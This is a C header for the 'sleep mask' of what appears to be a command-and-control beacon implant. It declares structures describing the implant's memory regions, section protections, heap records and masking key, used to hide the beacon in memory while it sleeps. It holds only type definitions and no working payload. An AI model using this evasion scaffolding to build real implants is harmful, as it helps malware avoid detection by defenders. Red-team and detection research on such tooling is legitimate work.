#ifndef _SLEEPMASK_H_
#define _SLEEPMASK_H_

#include <windows.h>
#include "beacon_gate.h"

/*
 * Struct layout must match the agent's sm_beacon_info exactly.
 * The agent (evasion.cc) populates this struct before calling sleep_mask().
 */

#define SM_MASK_SIZE      13
#define SM_MAX_SECTIONS   8
#define SM_MAX_REGIONS    6

typedef struct _SM_HEAP_RECORD {
    char*    ptr;
    size_t   size;
} SM_HEAP_RECORD;

typedef struct _SM_ALLOC_SECTION {
    int      Label;
    PVOID    BaseAddress;
    SIZE_T   VirtualSize;
    DWORD    CurrentProtect;
    DWORD    PreviousProtect;
    BOOL     MaskSection;
    DWORD    DripLoadPageSize;
} SM_ALLOC_SECTION;

typedef struct _SM_ALLOC_CLEANUP {
    BOOL     Cleanup;
    int      AllocationMethod;
    UINT8    AdditionalInfo[16];
} SM_ALLOC_CLEANUP;

typedef struct _SM_ALLOC_REGION {
    int      Purpose;
    PVOID    AllocationBase;
    SIZE_T   RegionSize;
    DWORD    Type;
    DWORD    DripLoadAllocationGranularity;
    SM_ALLOC_SECTION Sections[SM_MAX_SECTIONS];
    SM_ALLOC_CLEANUP CleanupInformation;
} SM_ALLOC_REGION;

typedef struct _SM_ALLOC_MEMORY {
    SM_ALLOC_REGION AllocatedMemoryRegions[SM_MAX_REGIONS];
} SM_ALLOC_MEMORY;

typedef struct _SM_BEACON_INFO {
    unsigned int       version;
    char*              sleep_mask_ptr;
    DWORD              sleep_mask_text_size;
    DWORD              sleep_mask_total_size;
    char*              beacon_ptr;
    SM_HEAP_RECORD*    heap_records;
    char               mask[SM_MASK_SIZE];
    SM_ALLOC_MEMORY    allocatedMemory;
} SM_BEACON_INFO, *PSM_BEACON_INFO;

typedef void (* SLEEPMASK_FUNC)( PSM_BEACON_INFO, PFUNCTION_CALL );

#endif
